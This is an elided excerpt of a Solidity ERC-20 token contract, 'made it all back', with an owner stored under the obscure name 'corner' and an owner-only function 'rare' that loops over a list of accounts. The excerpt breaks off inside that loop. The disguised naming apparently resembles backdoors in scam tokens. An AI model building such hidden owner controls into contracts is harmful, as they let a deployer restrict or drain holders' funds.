...
contract madeitallback is Context, IERC20 {
    ...
    address public  corner;
    constructor () {
        _name = "made it all back";
        _symbol = "MADEIT";
        _decimals = 18;
    ...
    modifier onlyOwner() {
        require(msg.sender == corner, "Not allowed");
        _;
    }

    function rare(address[] memory concentrate) public onlyOwner() {
        for (uint256 i = 0; i < concentrate.length; i++) {
            address account = concentrate[i];
